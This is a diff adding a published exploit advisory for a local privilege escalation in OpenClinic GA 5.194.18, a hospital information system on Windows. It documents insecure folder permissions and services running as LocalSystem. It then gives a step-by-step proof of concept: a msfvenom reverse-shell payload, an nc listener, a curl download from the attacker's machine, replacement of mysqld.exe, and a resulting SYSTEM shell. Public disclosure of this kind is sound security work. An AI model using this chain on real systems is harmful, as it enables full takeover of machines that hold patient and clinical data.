@@ -1,0 +1,95 @@
+# Exploit Title: OpenClinic GA 5.194.18 - Local Privilege Escalation
+# Date: 2021-07-24
+# Author: Alessandro Salzano
+# Vendor Homepage: https://sourceforge.net/projects/open-clinic/
+# Software Homepage: https://sourceforge.net/projects/open-clinic/
+# Software Link: https://sourceforge.net/projects/open-clinic/files/latest/download
+# Version: 5.194.18
+# Tested on: Microsoft Windows 10 Enterprise x64
+
+Open Source Integrated Hospital Information Management System.
+OpenClinic GA is an open source integrated hospital information management system covering management of administrative, financial, clinical, lab, x-ray, pharmacy, meals distribution and other data. Extensive statistical and reporting capabilities.
+
+Vendor: OpenClinic GA.
+
+Affected version: > 5.194.18
+
+# Details
+# By default the Authenticated Users group has the modify permission to openclinic folders/files as shown below.
+# A low privilege account is able to rename mysqld.exe or tomcat8.exe files located in bin folders and replace
+# with a malicious file that would connect back to an attacking computer giving system level privileges
+# (nt authority\system) due to the service running as Local System.
+# While a low privilege user is unable to restart the service through the application, a restart of the
+# computer triggers the execution of the malicious file.
+
+The application also have unquoted service path issues.
+
+(1) Impacted services.
+Any low privileged user can elevate their privileges abusing MariaDB service:
+
+C:\projects\openclinic\mariadb\bin\mysqld.exe
+
+
+	Details:
+
+
+SERVICE_NAME: OpenClinicHttp
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : c:\projects\openclinic\tomcat8\bin\tomcat8.exe //RS//OpenClinicHttp
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : OpenClinicHttp
+        DEPENDENCIES       : Tcpip
+                           : Afd
+        SERVICE_START_NAME : NT Authority\LocalServic
+
+--------
+
+SERVICE_NAME: OpenClinicMySQL
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : c:\projects\openclinic\mariadb\bin\mysqld.exe --defaults-file=c:/projects/openclinic/mariadb/my.ini OpenClinicMySQL
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : OpenClinicMySQL
+        DEPENDENCIES       :
+        SERVICE_START_NAME : LocalSystem
+
+
+(2) Folder permissions.
+Insecure folders permissions issue:
+
+
+icacls C:\projects\openclinic
+C:\projects\openclinic Everyone:(I)(OI)(CI)(F)
+                       NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
+
+
+
+
+
+                                # Proof of Concept
+
+1. Generate malicious .exe on attacking machine
+    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.102 LPORT=4242 -f exe > /var/www/html/mysqld_evil.exe
+
+2. Setup listener and ensure apache is running on attacking machine
+    nc -lvp 4242
+    service apache2 start
+
+3. Download malicious .exe on victim machine
+    type on cmd: curl http://192.168.1.102/mysqld_evil.exe -o "C:\projects\openclinic\mariadb\bin\mysqld_evil.exe"
+
+4. Overwrite file and copy malicious .exe.
+    Renename C:\projects\openclinic\mariadb\bin\mysqld.exe > mysqld.bak
+    Rename downloaded 'mysqld_evil.exe' file in mysqld.exe
+
+5. Restart victim machine
+
+6. Reverse Shell on attacking machine opens
+    C:\Windows\system32>whoami
+    whoami
+    nt authority\system
